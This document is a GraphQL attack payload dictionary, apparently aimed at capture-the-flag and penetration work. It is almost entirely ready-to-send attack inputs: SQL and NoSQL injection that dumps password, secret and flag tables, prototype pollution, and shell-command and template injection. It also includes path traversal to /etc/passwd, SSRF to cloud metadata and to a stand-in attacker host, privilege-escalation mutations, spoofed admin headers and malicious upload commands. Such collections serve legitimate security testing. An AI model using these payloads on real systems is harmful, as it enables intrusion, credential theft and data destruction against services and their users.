# Payload dictionary — the query corpus

Categorized payload corpus. Every payload is written as a `{"query":"..."}`
body or as the raw document — adapt quoting per transport.

---

## 1. Detection / fingerprinting

```graphql
{__typename}
{__schema{__typename}}
{__schema{queryType{name}}}
{__schema{queryType{name} mutationType{name} subscriptionType{name}}}
{__schema{types{name kind}}}
{_service{sdl}}
{_entities(representations:[]){__typename}}
{_any}
{__type(name:"Query"){name}}
{__type(name:"Mutation"){name}}
{__type(name:"Query"){fields{name}}}
{__schema{directives{name locations}}}
{__schema{types{name interfaces{name}}}}
{__schema{queryType{fields{name isDeprecated deprecationReason}}}}
mutation{__typename}
subscription{__typename}
{me{__typename}}
```

## 2. Introspection — bounded variants

```graphql
{__schema{types{name,fields{name}}}}
{__schema{types{name,fields{name,args{name,type{name}}}}}}
{__schema{types{name,kind,fields{name,type{name,kind,ofType{name,kind}}}}}}
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind,ofType{name,kind}}}}}}}
{__schema{queryType{fields{name,args{name,type{name,kind,ofType{name}}}}}}}
{__schema{mutationType{fields{name,args{name,type{name}}}}}}
{__schema{subscriptionType{fields{name,args{name}}}}}
{__type(name:"Query"){name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}
{__type(name:"Mutation"){name,fields{name,args{name,type{name}}}}}
{__type(name:"User"){name,fields{name,type{name,kind,ofType{name,kind}}}}}
{__type(name:"Admin"){name,fields{name}}}
{__type(name:"Config"){name,fields{name}}}
{__type(name:"Flag"){name,fields{name}}}
{__type(name:"Session"){name,fields{name}}}
{__type(name:"Secret"){name,fields{name}}}
```

## 3. Field-suggestion oracle probes

```graphql
{userss}
{userr}
{adminz}
{flagg}
{secrett}
{tokenn}
{configg}
{internalz}
{debugg}
{filez}
{logss}
{queryy}
{mutationn}
{backdoorr}
{allUserss}
{allSecretss}
{superSecretFlag}
{flagz}
{hiddenz}
{privatez}
{envz}
{varzz}
{keyz}
{credss}
```

Each typo'd name returns `Did you mean "..."?` — every suggestion is a real
field name.

## 4. Type-confusion / parser-differential payloads

```graphql
{x}
{}
{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{x}
{__typename}{__typename}{__typename}
{__typename,__typename,__typename}
{a:__typename b:__typename c:__typename}
{user(id:1){id}}
{user(id:"1"){id}}
{user(id:"01"){id}}
{user(id:"1.0"){id}}
{user(id:"1e2"){id}}
{user(id:"+1"){id}}
{user(id:"-1"){id}}
{user(id:" 1"){id}}
{user(id:"1 "){id}}
{user(id:"0x1"){id}}
{user(id:null){id}}
{user(id:){id}}
{user(){id}}
{user(id:[1]){id}}
{user(id:{"v":1}){id}}
{user(id:NaN){id}}
{user(id:Infinity){id}}
{user(id:1e308){id}}
{user(id:99999999999999999999){id}}
{user(id:true){id}}
{user(id:"true"){id}}
{user(id:"false"){id}}
{user(id:"null"){id}}
{user(id:"undefined"){id}}
{user(id:"object Object"){id}}
{user(id:"[object Object]"){id}}
{user(id:"[]"){id}}
{user(id:"{}"){id}}
{user(id:"1 OR 1=1"){id}}
{user(id:"1' OR '1'='1"){id}}
{user(id:"1; DROP"){id}}
{user(id:"..%2f..%2f"){id}}
{user(id:"%00"){id}}
{user(id:"\u0000"){id}}
{user(id:"\u0027"){id}}
{user(id:"\u0031"){id}}
{f(x:"A"*1000000)}
{f(x:"%s")}
{f(x:"{{7*7}}")}
{f(x:"${7*7}")}
{f(x:"<%= 7*7 %>")}
{f(x:"#{7*7}")}
{f(x:"*7*7*")}
```

## 5. SQL-injection payloads through arguments

```graphql
{user(name:"'"){id}}
{user(name:"''"){id}}
{user(name:"\\"){id}}
{user(name:"x' OR '1'='1"){id}}
{user(name:"x' OR 1=1--"){id}}
{user(name:"x' OR 1=1#"){id}}
{user(name:"x' OR 1=1/*"){id}}
{user(name:"x\" OR \"1\"=\"1"){id}}
{user(name:"x' AND 1=1--"){id}}
{user(name:"x' AND 1=2--"){id}}
{user(name:"x' UNION SELECT 1--"){id}}
{user(name:"x' UNION SELECT 1,2--"){id}}
{user(name:"x' UNION SELECT 1,2,3--"){id}}
{user(name:"x' UNION SELECT null,null,null--"){id}}
{user(name:"x' ORDER BY 1--"){id}}
{user(name:"x' ORDER BY 99--"){id}}
{user(name:"x' UNION SELECT version()--"){id}}
{user(name:"x' UNION SELECT @@version--"){id}}
{user(name:"x' UNION SELECT user()--"){id}}
{user(name:"x' UNION SELECT database()--"){id}}
{user(name:"x' UNION SELECT table_name FROM information_schema.tables--"){id}}
{user(name:"x' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"){id}}
{user(name:"x' UNION SELECT password FROM users--"){id}}
{user(name:"x' UNION SELECT flag FROM flag--"){id}}
{user(name:"x' UNION SELECT flag FROM flags--"){id}}
{user(name:"x' UNION SELECT secret FROM secrets--"){id}}
{user(name:"x'; DROP TABLE users--"){id}}
{user(name:"x'; SELECT pg_sleep(5)--"){id}}
{user(name:"x' AND SLEEP(5)--"){id}}
{user(name:"x' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)--"){id}}
{user(name:"x' AND extractvalue(1,concat(0x7e,version()))--"){id}}
{user(name:"x' AND updatexml(1,concat(0x7e,version()),1)--"){id}}
{user(name:"x' UNION SELECT LOAD_FILE('/etc/passwd')--"){id}}
{user(name:"x' UNION SELECT 'a' INTO OUTFILE '/tmp/x'--"){id}}

# sqlite-specific
{user(name:"x' UNION SELECT name FROM sqlite_master WHERE type='table'--"){id}}
{user(name:"x' UNION SELECT sql FROM sqlite_master--"){id}}
{user(name:"x' UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name NOT LIKE 'sqlite_%'--"){id}}

# the VolgaCTF backslash-escape pattern — filter objects
{f(filter:{login:"'"}){id}}
{f(filter:{login:"\\" email:" OR 1=1 -- "}){id}}
{f(filter:{login:"\\" email:" UNION SELECT 1,2,3-- "}){id}}
{f(filter:{login:"\\" password:" UNION SELECT flag,2,3-- "}){id}}
{f(filter:{a:"\\" b:" OR '1'='1' -- "}){id}}
{f(filter:{a:"\\" b:" UNION SELECT null,null-- "}){id}}

# enum-sort injection — ORDER BY concatenation
{products(sort:"price, (SELECT flag FROM flags)"){name}}
{products(sort:"price; DROP--"){name}}
{products(sort:"(CASE WHEN 1=1 THEN price ELSE name END)"){name}}
{products(sort:"price`"){name}}
{products(orderBy:"id DESC, (SELECT 1)"){name}}
{users(orderBy:"1, (SELECT flag FROM flags LIMIT 1)"){name}}
{users(order:"name ASC; SELECT pg_sleep(5)--"){name}}
{posts(sortBy:"created_at; WAITFOR DELAY '0:0:5'--"){title}}
```

## 6. NoSQL payloads through arguments

```graphql
# operator objects in JSON scalars / input objects
{user(login:{name:"admin", password:{"$ne":null}}){id}}
{user(filter:{username:"admin", password:{"$ne":""}}){id}}
{user(filter:{username:"admin", password:{"$gt":""}}){id}}
{user(filter:{username:"admin", password:{"$regex":".*"}}){id}}
{user(filter:{username:"admin", password:{"$exists":true}}){id}}
{user(filter:{username:"admin", password:{"$in":[""]}}){id}}
{user(filter:{username:{"$regex":"^admin"}, password:{"$ne":null}}){id}}
{users(filter:{role:{"$regex":".*"}}){name}}
{users(filter:{role:{"$in":["admin","root"]}}){name}}
{users(filter:{email:{"$regex":".*@internal"}}){name}}
{search(q:{"$where":"this.role=='admin'"}){name}}
{search(q:{"$where":"sleep(3000); return true"}){name}}
{search(q:{"$where":"1;return true"}){name}}
{search(q:{"$expr":{"$eq":["$role","admin"]}}){name}}
{search(q:{"$expr":{"$regexMatch":{"input":"$flag","regex":"^flag"}}}){name}}
{search(q:{"$or":[{"role":"admin"},{"flag":{"$exists":true}}]}){name}}
{search(q:{"$and":[{"a":1},{"$where":"this.flag"}]}){name}}
{users(filter:{"password":{"$regex":"^f"}}){name}}
{users(filter:{"password":{"$regex":"^fl"}}){name}}
{users(filter:{"password":{"$regex":"^flag\\{"}}){name}}
{users(filter:{"token":{"$regex":"^[a-z]"}}){name}}

# prototype pollution via JSON args
{update(data:{"__proto__":{"isAdmin":true}}){ok}}
{update(data:{"constructor":{"prototype":{"role":"admin"}}}){ok}}
{update(data:{"__proto__.isAdmin":true}){ok}}
{config(opts:{"__proto__":{"env":"dev"}}){ok}}

# cast confusions
{user(id:{"$gt":0}){id}}
{user(id:{"$ne":0}){id}}
{user(id:{"$in":[1,2,3]}){id}}
{user(id:{"$regex":"^1"}){id}}
{user(id:{"$where":"true"}){id}}
{user(id:{"$exists":true}){id}}
{user(id:{"$type":7}){id}}
{user(id:{"$eq":"000000000000000000000001"}){id}}
```

## 7. Command-injection / template / file args

```graphql
{ping(host:"127.0.0.1"){ok}}
{ping(host:"127.0.0.1;id"){ok}}
{ping(host:"127.0.0.1&&id"){ok}}
{ping(host:"127.0.0.1|id"){ok}}
{ping(host:"127.0.0.1`id`"){ok}}
{ping(host:"127.0.0.1$(id)"){ok}}
{ping(host:"127.0.0.1;cat${IFS}/flag"){ok}}
{ping(host:"127.0.0.1;cat${IFS}/flag.txt"){ok}}
{ping(host:"a|id|x"){ok}}
{exec(cmd:"id"){out}}
{run(command:"cat /flag"){result}}
{debug(code:"system('id')"){out}}
{eval(expr:"os.system('id')"){out}}
{system(cmd:"whoami"){out}}
{render(template:"{{7*7}}"){out}}
{render(template:"<%= 7*7 %>"){out}}
{render(template:"#{7*7}"){out}}
{render(template:"${7*7}"){out}}
{render(template:"{{config}}"){out}}
{render(template:"{{self._TemplateReference__context}}"){out}}
{readFile(path:"/etc/passwd"){content}}
{readFile(path:"../../../etc/passwd"){content}}
{readFile(path:"....//....//etc/passwd"){content}}
{readFile(path:"/flag"){content}}
{readFile(path:"/flag.txt"){content}}
{readFile(path:"/app/flag"){content}}
{readFile(path:"flag"){content}}
{download(file:"/proc/self/environ"){data}}
{download(file:"/proc/self/cmdline"){data}}
{load(path:"php://filter/convert.base64-encode/resource=/flag"){data}}
{importFile(path:"file:///etc/passwd"){ok}}
```

## 8. SSRF args

```graphql
{fetch(url:"http://169.254.169.254/latest/meta-data/"){data}}
{fetch(url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/"){data}}
{fetch(url:"http://localhost/"){data}}
{fetch(url:"http://127.0.0.1/"){data}}
{fetch(url:"http://0.0.0.0/"){data}}
{fetch(url:"http://[::1]/"){data}}
{fetch(url:"http://127.1/"){data}}
{fetch(url:"http://2130706433/"){data}}
{fetch(url:"http://0x7f000001/"){data}}
{fetch(url:"file:///etc/passwd"){data}}
{fetch(url:"file:///flag"){data}}
{fetch(url:"gopher://127.0.0.1:6379/_INFO"){data}}
{fetch(url:"dict://127.0.0.1:6379/INFO"){data}}
{fetch(url:"ftp://127.0.0.1/"){data}}
{fetch(url:"http://attacker.tld/cb"){data}}
{webhook(url:"http://attacker.tld/x"){ok}}
{avatar(url:"http://attacker.tld/x.png"){url}}
{proxy(target:"http://internal:8080/"){data}}
{importData(url:"file:///proc/self/environ"){ok}}
{preview(url:"http://attacker.tld/"){html}}
```

## 9. IDOR field probes

```graphql
{user(id:1){id}}
{user(id:2){id}}
{user(id:0){id}}
{user(id:-1){id}}
{user(id:99999){id}}
{user(id:"admin"){id}}
{users{id}}
{allUsers{id}}
{allUsers{email}}
{me{id}}
{me{email}}
{me{role}}
{me{token}}
{me{apiKey}}
{me{session}}
{me{sessions{token}}}
{admin{id}}
{admin{email}}
{account(id:1){balance}}
{order(id:1){total}}
{order(orderId:"1"){total}}
{document(id:1){content}}
{document(uuid:"00000000-0000-0000-0000-000000000001"){content}}
{file(id:1){name}}
{file(name:"flag.txt"){content}}
{file(name:"../../../etc/passwd"){content}}
{message(id:1){body}}
{note(id:1){content}}
{post(id:1){author{email}}}
{post(id:1){author{token}}}
{comment(id:1){author{email}}}
{search(q:"a"){id}}
{search(q:"%"){id}}
{search(q:"*"){id}}
{search(q:"_"){id}}
{search(q:"."){id}}
{logs{entries}}
{auditLog{events}}
{debug{env}}
{debug{vars}}
{internal{config}}
{config{dbPassword}}
{config{jwtSecret}}
{secrets{value}}
{flag{value}}
{flag{content}}
{flags{value}}
{getFlag{value}}
{getFlag(token:"x"){value}}
{flag(token:"x")}
{secretFlag}
{super_secret_flag}
{superSecretFlagDispenser}
{backdoor{id:"1",hash:"x"}}
{internal_api{key}}
{env{name:"FLAG"}}
{env(name:"FLAG"){value}}
{variable(name:"FLAG"){value}}
{system{info}}
{health{status}}
{status{ok}}
{info{version}}
{version}
```

## 10. Node-interface payloads

```graphql
{node(id:"VXNlcjox"){__typename}}
{node(id:"VXNlcjox"){... on User{id}}}
{node(id:"VXNlcjox"){... on User{email}}}
{node(id:"VXNlcjo0Mg=="){... on User{email}}}
{node(id:"RmxhZzox"){__typename}}
{node(id:"RmxhZzox"){... on Flag{value}}}
{node(id:"QWRtaW46MQ=="){... on Admin{apiKey}}}
{node(id:"U2VjcmV0OjE="){... on Secret{value}}}
{node(id:"Q29uZmlnOjE="){... on Config{dbPassword}}}
{node(id:"U2Vzc2lvbjox"){... on Session{token}}}
{node(id:"T3JkZXI6MQ=="){... on Order{total}}}
{node(id:"RG9jdW1lbnQ6MQ=="){... on Document{content}}}
{node(id:"SW50ZXJuYWxDb25maWc6MQ=="){... on InternalConfig{env}}}
{nodes(ids:["VXNlcjox","VXNlcjoy"]){__typename}}
{nodes(ids:["VXNlcjox","VXNlcjoy","VXNlcjoz"]){... on User{email}}}
```

## 11. Batching / alias payloads

```graphql
{a1:u(id:1){e} a2:u(id:2){e} a3:u(id:3){e} a4:u(id:4){e} a5:u(id:5){e}}
{a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email}}
{t1:login(u:"a",p:"x"){ok} t2:login(u:"a",p:"y"){ok} t3:login(u:"a",p:"z"){ok}}
{v1:verify(code:"000001"){ok} v2:verify(code:"000002"){ok}}
{x1:flag(i:"a") x2:flag(i:"b") x3:flag(i:"c") x4:flag(i:"d")}
{b1:s(q:"a"){id} b2:s(q:"b"){id} b3:s(q:"c"){id} b4:s(q:"d"){id}}
{n1:node(id:"VXNlcjox"){__typename} n2:node(id:"VXNlcjoy"){__typename}}
{m1:user(id:1){id} m2:me{id} m3:users{id} m4:admin{id}}
```

## 12. Mutation payloads

```graphql
mutation{__typename}
mutation{login(user:"a",pass:"b"){token}}
mutation{login(username:"a",password:"b"){token}}
mutation{login(email:"a",password:"b"){token}}
mutation{signin(user:"a",pass:"b"){token}}
mutation{authenticate(user:"a",pass:"b"){token}}
mutation{register(user:"x",pass:"y"){id}}
mutation{register(input:{username:"x",password:"y"}){id}}
mutation{register(input:{username:"x",password:"y",role:"admin"}){id}}
mutation{register(input:{username:"x",password:"y",isAdmin:true}){id}}
mutation{register(input:{username:"x",password:"y",verified:true}){id}}
mutation{register(input:{username:"x",password:"y",balance:99999}){id}}
mutation{register(input:{username:"x",password:"y",permissions:["*"]}){id}}
mutation{createUser(input:{name:"x",role:"admin"}){id}}
mutation{addUser(name:"x",role:"admin"){id}}
mutation{updateUser(id:1,input:{role:"admin"}){id}}
mutation{updateUser(id:1,input:{password:"x"}){id}}
mutation{updateUser(id:1,input:{email:"x@x.tld"}){id}}
mutation{updateProfile(bio:"x"){ok}}
mutation{updateUserRole(userId:2,role:"admin"){id}}
mutation{setAdmin(id:2){ok}}
mutation{setRole(userId:2,role:"admin"){ok}}
mutation{promote(userId:2,to:"admin"){ok}}
mutation{promoteUser(id:2){ok}}
mutation{grantPermission(user:"me",perm:"*"){ok}}
mutation{grantRole(id:2,role:"admin"){ok}}
mutation{makeAdmin(id:2){ok}}
mutation{giveAdmin(id:2){ok}}
mutation{elevate(id:2){ok}}
mutation{verifyUser(id:2){ok}}
mutation{approveUser(id:2){ok}}
mutation{activateUser(id:2){ok}}
mutation{unlockUser(id:2){ok}}
mutation{resetPassword(email:"x"){ok}}
mutation{forgotPassword(email:"x"){ok}}
mutation{changePassword(old:"x",new:"y"){ok}}
mutation{updateEmail(id:1,email:"x@x.tld"){ok}}
mutation{impersonate(userId:1){token}}
mutation{loginAs(userId:1){token}}
mutation{switchUser(userId:1){token}}
mutation{debug(cmd:"id"){out}}
mutation{exec(cmd:"id"){out}}
mutation{run(cmd:"id"){out}}
mutation{eval(code:"id"){out}}
mutation{system(cmd:"id"){out}}
mutation{shell(cmd:"id"){out}}
mutation{cmd(c:"id"){out}}
mutation{deleteUser(id:2){ok}}
mutation{deleteAll{ok}}
mutation{dropTable{ok}}
mutation{reset{ok}}
mutation{export(type:"all"){data}}
mutation{dump{data}}
```

## 13. Subscription payloads

```graphql
subscription{__typename}
subscription{notify}
subscription{messageAdded}
subscription{messageAdded(channel:"room:1")}
subscription{messageAdded(channel:"room:2")}
subscription{messageAdded(channel:"admin")}
subscription{newMessage{body}}
subscription{newFlag{value}}
subscription{flag{value}}
subscription{secret{value}}
subscription{event{type}}
subscription{events{type}}
subscription{adminEvents{type}}
subscription{presence{user}}
subscription{userJoined{id}}
subscription{userLeft{id}}
```

## 14. Federation payloads

```graphql
{_service{sdl}}
{_service{__typename}}
{_entities(representations:[]){__typename}}
{_entities(representations:[{__typename:"User",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"User",id:"1"}]){... on User{email}}}
{_entities(representations:[{__typename:"Admin",id:"1"}]){... on Admin{apiKey}}}
{_entities(representations:[{__typename:"Flag",id:"1"}]){... on Flag{value}}}
{_entities(representations:[{__typename:"Config",id:"1"}]){... on Config{dbPassword}}}
{_entities(representations:[{__typename:"User",id:"1"},{__typename:"User",id:"2"}]){... on User{email}}}
{_entities(representations:[{__typename:"Session",token:"x"}]){__typename}}
{_entities(representations:[{__typename:"Order",number:"1"}]){__typename}}
```

## 15. Fragment / directive payloads

```graphql
fragment F on Query{__typename}
{...F}
fragment F on Query{admin{secrets}}
{...F}
fragment U on User{email token role sessions{token}}
{user(id:1){...U}}
{a:__typename} fragment F on Query{x}
query Q{__typename} fragment F on Query{__typename}
{__typename ... on Query{__typename}}
{__typename @include(if:true)}
{__typename @skip(if:false)}
{__typename @include(if:1)}
{__typename @skip(if:0)}
{__typename @cacheControl(maxAge:999999)}
{__typename @defer}
{user{__typename ... on User@defer{email}}}
{__typename @deprecated}
{f @nonexistent}
{__typename @@double}
{f @a @b @c @d @e @f @g @h @i @j}
```

## 16. Variables / JSON-carrier payloads

```json
{"query":"query($x:String){f(x:$x)}","variables":{"x":"payload"}}
{"query":"query($x:ID){f(id:$x)}","variables":{"x":{"$ne":null}}}
{"query":"query($x:ID){f(id:$x)}","variables":{"x":[1]}}
{"query":"query($x:ID){f(id:$x)}","variables":{"x":true}}
{"query":"query($x:ID){f(id:$x)}","variables":{"x":"1 OR 1=1"}}
{"query":"query($x:JSON){f(filter:$x)}","variables":{"x":{"$ne":null}}}
{"query":"query($x:JSON){f(filter:$x)}","variables":{"x":{"__proto__":{"isAdmin":true}}}}
{"query":"query($x:JSON){f(filter:$x)}","variables":{"x":{"$where":"true"}}}
{"query":"query($x:JSON){f(filter:$x)}","variables":{"x":{"$regex":".*"}}}
{"query":"query($x:JSON){f(filter:$x)}","variables":{"x":{"a":{"$ne":null}}}}
{"query":"query($x:Int){f(id:$x)}","variables":{"x":"1"}}
{"query":"query($x:Int){f(id:$x)}","variables":{"x":1e308}}
{"query":"query($x:Int){f(id:$x)}","variables":{"x":99999999999999999999}}
{"query":"query($x:Int){f(id:$x)}","variables":{"x":true}}
{"query":"query($x:Int){f(id:$x)}","variables":{"x":null}}
{"query":"query($x:[Int]){f(ids:$x)}","variables":{"x":1}}
{"query":"query($x:[Int]){f(ids:$x)}","variables":{"x":[1,"x",null,true,{"y":1}]}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$ne":null}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":"{{7*7}}"}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":"'; DROP--"}}
{"query":"query($x:String!){f(x:$x)}","variables":{}}
{"query":"query($x:String!){f(x:$x)}","variables":{"x":null}}
{"query":"query($x:String!){f(x:$x)}","variables":{"x":""}}
```

## 17. Header / transport payloads

```text
Content-Type: application/json
Content-Type: application/graphql
Content-Type: application/graphql+json
Content-Type: application/graphql-response+json
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain
Content-Type: multipart/form-data
Content-Type: application/octet-stream
Accept: application/json
Accept: application/graphql-response+json
Accept: text/html
x-apollo-operation-name: X
apollo-require-preflight: true
x-apollo-federation-include-trace: ftv1
x-apollo-debug: 1
x-graphql-debug: 1
x-graphql-tracing: 1
x-hasura-role: admin
x-hasura-admin-secret: x
x-hasura-user-id: 1
x-user-id: 1
x-user-role: admin
x-scopes: admin
x-scopes: *
```

## 18. Error-inducing probes

```graphql
{x
{x}
{}
{{x}}
{{{x}}}
{...}
{...x}
{... on Query{__typename}}
{... on x{__typename}}
{...f}
fragment{f}
query{__typename}
query q{__typename}
query q(x:){__typename}
query q($x:){__typename}
mutation{__typename}
subscription{__typename}
{__typename extra}
{__typename:42}
{__typename 42}
{f(x:NaN)}
{f(x:Infinity)}
{f(x:-Infinity)}
{f(x:0x1)}
{f(x:1e)}
{f(x:.1)}
{f(x:01)}
{f(x:1.)}
{f(x:+1)}
{f(x:--1)}
{f(x:"\u")}
{f(x:"\x")}
{f(x:"\\")}
{f(x:"\")}
{f(x:"""")}
{f(x:""" """)}
{f(x:"'''")}
{__schema}
{__type}
{__type()}
{__type(name:)}
{__type(name:"")}
{__type(name:"Query")}
{__schema{__schema}}
{__schema{__typename}}
{__typename{__typename}}
{__typename{x}}
{__typename.__typename}
```

## 19. Depth / cost probes

```graphql
{u{f{f{f{f{f{f{f{f{id}}}}}}}}}}           # depth 10
{u{f{f{f{f{f{f{f{f{f{f{f{id}}}}}}}}}}}}}}  # depth 13
{u{f{f{f{f{f{f{f{f{f{f{f{f{f{id}}}}}}}}}}}}}}}  # depth 15
{a{b{c{d{e{f{g{h{i{j{k{l{m{id}}}}}}}}}}}}}}  # deep chain
```

Circular-shape:

```graphql
{user{friends{friends{friends{friends{id}}}}}}
{user{friends{friends{friends{friends{friends{friends{id}}}}}}}}
```

Alias-mass:

```graphql
{a1:x a2:x a3:x a4:x a5:x a6:x a7:x a8:x a9:x a10:x}
{a1:x a2:x a3:x a4:x a5:x a6:x a7:x a8:x a9:x a10:x a11:x a12:x a13:x a14:x a15:x a16:x a17:x a18:x a19:x a20:x}
```

## 20. Multipart / upload payloads

```bash
# operations+map+file — graphql-multipart-request-spec
curl -s "$BASE/graphql" \
  -F 'operations={"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
  -F 'map={"0":["variables.f"]}' \
  -F '0=@/tmp/test.png;type=image/png'

# traversal filename
  -F '0=@/tmp/x;filename=../../../tmp/evil.php'

# content-type lie
  -F '0=@/tmp/x.php;type=image/png'

# polyglot
  -F '0=@/tmp/poly.png.php'

# null upload
  -F 'operations={"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
  -F 'map={"0":["variables.f"]}'
```

## 21. Introspection-disabled probes

```graphql
{_service{sdl}}
{_entities(representations:[]){__typename}}
{__type(name:"Query"){fields{name}}}
{__type(name:"Query"){name}}
{__type(name:"Mutation"){name}}
{__type(name:"Subscription"){name}}
{__type(name:"User"){name}}
{__schema{__typename}}
{__schema{queryType{name}}}
{__schema{mutationType{name}}}
{__schema{types{name kind}}}
{__schema{types{name,fields{name}}}}
{__schema{types{name,fields{name,args{name}}}}}
{__schema{queryType{fields{name,args{name}}}}}
{__schema{queryType{fields{name,type{name}}}}}
{__schema{queryType{fields{name,type{name,ofType{name}}}}}}
{userss}
{userr}
{adminz}
{flagg}
{secrett}
{tokenn}
{configg}
{allUserss}
{debugg}
{filez}
{logss}
{envz}
{varzz}
{keyz}
{backdoorr}
{superSecretFlag}
{flagz}
{hiddenz}
{privatez}
```

## 22. Encoding tricks

```graphql
# inside GraphQL strings — \uXXXX escapes
{f(x:"\u0027")}         # '
{f(x:"\u0022")}         # "
{f(x:"\u005c")}         # \
{f(x:"\u0000")}         # null byte
{f(x:"\u0061dmin")}     # admin
{f(x:"\u0024ne")}       # $ne
{f(x:"\u0027 OR 1=1--")}  # ' OR 1=1--
{f(x:"\u0027 UNION SELECT 1--")}
{f(x:"x\u0027\u0020OR\u00201=1--")}

# GraphQL comment-tricks — # inside document
{admi#x
n{secrets}}
{adm#x
in{secrets}}
{a#x
dmin{secrets}}
{u#x
ser(id:1){id}}
{f#x
ilter:{x:"1"}){id}}

# block-string raw content — no escaping needed
{f(x:"""raw ' " \ content""")}
{f(x:"""x' OR 1=1--""")}
{f(x:"""'; DROP TABLE--""")}
{f(x:"""line1
line2'OR'1'='1""")}

# unicode normalization tricks
{f(x:"admin")}
{f(x:"dmin")}          # cyrillic 
{f(x:"Ａdmin")}          # fullwidth A
{f(x:"Ⓐdmin")}
{f(x:"admın")}          # dotless ı
{f(x:"adm𝒊n")}
```

## 23. Access-boundary probes

```graphql
{me{id}}
{me{email}}
{me{role}}
{me{permissions}}
{me{token}}
{me{apiKey}}
{me{session}}
{me{sessions{token}}}
{me{documents{uuid}}}
{me{files{name}}}
{me{orders{id}}}
{me{account{balance}}}
{me{settings}}
{me{preferences}}
{me{privateNotes}}
{me{secret}}
{me{flag}}
{viewer{id}}
{viewer{user{email}}}
{viewer{me{email}}}
{currentUser{email}}
{currentUser{role}}
{authenticatedUser{email}}
{session{token}}
{session{id}}
{auth{token}}
{auth{user{role}}}
{context{user{role}}}
{identity{claims}}
{principal{role}}
{credentials{token}}
{token{value}}
{access{token}}
{accessToken}
{jwt}
{apiKey}
{key{value}}
{credential{value}}
```

## 24. Admin / debug fields

```graphql
{admin{users{email}}}
{admin{config}}
{admin{flag}}
{admin{secrets}}
{admin{debug}}
{admin{env}}
{admin{vars}}
{admin{system}}
{admin{status}}
{admin{info}}
{admin{version}}
{admin{health}}
{admin{metrics}}
{admin{stats}}
{admin{logs}}
{admin{auditLog}}
{admin{internal}}
{admin{backdoor}}
{admin{execute(cmd:"id")}}
{admin{eval(code:"id")}}
{admin{run(cmd:"id")}}
{admin{shell(cmd:"id")}}
{debug{env}}
{debug{vars}}
{debug{config}}
{debug{secrets}}
{debug{stack}}
{debug{trace}}
{debug{logs}}
{debug{info}}
{debug{dump}}
{debug{eval(code:"id")}}
{debug{exec(cmd:"id")}}
{debug{run(cmd:"id")}}
{debug{system(cmd:"id")}}
{internal{config}}
{internal{flag}}
{internal{secret}}
{internal{env}}
{internal{vars}}
{internal{debug}}
{internal{api{key}}}
{internal{api{url}}}
{internal{api{endpoint}}}
{internal{service{url}}}
{internal{service{endpoint}}}
{internal{routes}}
{internal{endpoints}}
{internal{schema}}
{internal{metadata}}
{internal{version}}
{internal{health}}
{internal{status}}
{internal{info}}
{internal{stats}}
{internal{metrics}}
{internal{logs}}
{internal{audit}}
{internal{db{url}}}
{internal{db{config}}}
{internal{database{url}}}
{internal{database{config}}}
{internal{connection{url}}}
{internal{redis{url}}}
{internal{mongo{url}}}
{internal{dbPassword}}
{internal{jwtSecret}}
{internal{apiKey}}
{internal{secretKey}}
{internal{privateKey}}
{internal{credentials}}
{internal{secrets}}
{internal{tokens}}
{internal{keys}}
{internal{env{name:"FLAG"}}}
{internal{env(name:"FLAG"){value}}}
{internal{var(name:"FLAG"){value}}}
{internal{variable(name:"FLAG"){value}}}
{internal{setting(name:"flag"){value}}}
{internal{config(name:"flag"){value}}}
{internal{config(name:"secret"){value}}}
{internal{config(name:"key"){value}}}
{internal{config(name:"token"){value}}}
{internal{config(name:"db"){value}}}
{internal{config(name:"database"){value}}}
{internal{config(name:"url"){value}}}
{internal{config(name:"password"){value}}}
{internal{config(name:"apikey"){value}}}
{internal{config(name:"api_key"){value}}}
{internal{config(name:"jwt"){value}}}
{internal{config(name:"jwt_secret"){value}}}
{internal{config(name:"jwtsecret"){value}}}
{internal{config(name:"secret_key"){value}}}
{internal{config(name:"secretkey"){value}}}
{internal{config(name:"private_key"){value}}}
{internal{config(name:"privatekey"){value}}}
```

## 25. Wildcard list fields

```graphql
{users{id}}
{allUsers{id}}
{allUsers{email}}
{allUsers{token}}
{allUsers{password}}
{allUsers{role}}
{allUsers{apiKey}}
{allUsers{session{token}}}
{allUsers{sessions{token}}}
{allAccounts{id}}
{allAccounts{email}}
{allAccounts{balance}}
{allOrders{id}}
{allOrders{total}}
{allOrders{owner{email}}}
{allDocuments{id}}
{allDocuments{content}}
{allDocuments{uuid}}
{allFiles{id}}
{allFiles{name}}
{allFiles{path}}
{allMessages{id}}
{allMessages{body}}
{allMessages{sender{email}}}
{allMessages{recipient{email}}}
{allNotes{id}}
{allNotes{content}}
{allPosts{id}}
{allPosts{author{email}}}
{allPosts{author{token}}}
{allComments{id}}
{allComments{author{email}}}
{allSecrets{id}}
{allSecrets{value}}
{allTokens{id}}
{allTokens{value}}
{allSessions{id}}
{allSessions{token}}
{allApiKeys{id}}
{allApiKeys{key}}
{allKeys{id}}
{allKeys{value}}
{allCredentials{id}}
{allCredentials{value}}
{allConfigs{id}}
{allConfigs{value}}
{allFlags{id}}
{allFlags{value}}
{allFlags{content}}
{everything{id}}
{all{id}}
{list{id}}
{all{id,email,role}}
{dump{id}}
{export{id}}
{backup{id}}
{data{id}}
{records{id}}
{items{id}}
{entries{id}}
{objects{id}}
{entities{id}}
{rows{id}}
{results{id}}
```
